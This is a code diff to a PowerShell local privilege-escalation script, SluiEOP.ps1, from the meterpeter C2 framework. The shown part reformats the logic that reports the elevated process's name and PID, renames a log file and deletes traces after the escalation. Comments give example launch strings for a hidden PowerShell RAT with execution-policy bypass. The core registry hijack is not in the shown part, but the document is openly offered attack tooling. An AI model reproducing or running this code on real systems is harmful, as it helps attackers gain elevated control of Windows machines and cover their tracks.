@@ -47,6 +47,7 @@
 
 
 $Command = $Null
+$DetailedDataDump = $False
 $param1 = $args[0] # User Inputs [<Arguments>]
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$env:WINDIR\System32\cmd.exe"
@@ -110,61 +111,61 @@ If($CheckVuln -eq $True){
       AMD64        notepad      5543
    #>
 
+   If($DetailedDataDump -eq $True){
 
-If($DetailedDataDump -eq $True){
-   If($Command -match ' '){
-      ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
-      $ParsingData = $Command -Split(' ')
-      $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
-      If($ProcessName -match '.exe'){
-         $ProcessName = $ProcessName -replace '.exe',''
-         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-      }else{
+      If($Command -match ' '){
+         ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
+         $ParsingData = $Command -Split(' ')
+         $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
+         If($ProcessName -match '.exe'){
+            $ProcessName = $ProcessName -replace '.exe',''
+            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         }else{
+            $EOPID = "null"
+         }
+      }
+      ElseIf(-not($Command -match ' ') -and $Command -match '\\'){
+         ## String: "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
+         $ProcessName = Split-Path "$Command" -Leaf
+         If($ProcessName -match '.exe'){
+            $ProcessName = $ProcessName -replace '.exe',''
+            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         }else{
+            $EOPID = "null"
+         }
+      }
+      ElseIf($Command -match '^[powershell]' -and $Command -match '.ps1' -or $Command -match '.vbs' -or $Command -match '.py' -or $Command -match '.bat'){
+         ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
+         $ParsingData = $Command -Split('\\')
+         $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
          $EOPID = "null"
       }
-   }
-   ElseIf(-not($Command -match ' ') -and $Command -match '\\'){
-      ## String: "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
-      $ProcessName = Split-Path "$Command" -Leaf
-      If($ProcessName -match '.exe'){
-         $ProcessName = $ProcessName -replace '.exe',''
-         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-      }else{
-         $EOPID = "null"
+      Else{
+         ## String: "powershell.exe"
+         $ProcessName = Split-Path "$Command" -Leaf
+         If($ProcessName -match '.exe'){
+            $ProcessName = $ProcessName -replace '.exe',''
+            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         }else{
+            $EOPID = "null"
+         }
       }
-   }
-   ElseIf($Command -match '^[powershell]' -and $Command -match '.ps1' -or $Command -match '.vbs' -or $Command -match '.py' -or $Command -match '.bat'){
-      ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
-      $ParsingData = $Command -Split('\\')
-      $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
-      $EOPID = "null"
-   }
-   Else{
-      ## String: "powershell.exe"
-      $ProcessName = Split-Path "$Command" -Leaf
-      If($ProcessName -match '.exe'){
-         $ProcessName = $ProcessName -replace '.exe',''
-         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-      }else{
-         $EOPID = "null"
-      }
-   }
-}
 
-   ## Build MY PSObject Table
-   # IF executed outside meterpeter C2 framework
-   $MYPSObjectTable = New-Object -TypeName PSObject
-   $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$env:PROCESSOR_ARCHITECTURE"
-   $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
-   $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
-   $MYPSObjectTable
+      ## Build MY PSObject Table
+      # IF executed outside meterpeter C2 framework
+      $MYPSObjectTable = New-Object -TypeName PSObject
+      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$env:PROCESSOR_ARCHITECTURE"
+      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
+      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
+      $MYPSObjectTable
+   }
 
-}else{
+}Else{
    ## Vulnerable registry hive => not found
-   echo "   ERROR    System Doesn't Seems Vulnerable, Aborting." > $env:TMP\fail.log
+   echo "   ERROR    System Doesn't Seems Vulnerable, Aborting." > $env:TMP\sLUIEop.log
 }
 
 ## Clean old files/configurations left behind after EOP finished ..
-If(Test-Path "$env:TMP\fail.log"){Get-Content -Path "$env:TMP\fail.log" -EA SilentlyContinue;Remove-Item -Path "$env:TMP\fail.log" -Force -EA SilentlyContinue}
+If(Test-Path "$env:TMP\sLUIEop.log"){Get-Content -Path "$env:TMP\sLUIEop.log" -EA SilentlyContinue;Remove-Item -Path "$env:TMP\sLUIEop.log" -Force -EA SilentlyContinue}
 If(Test-Path "$env:TMP\SluiEOP.ps1"){Remove-Item -Path "$env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
 Exit
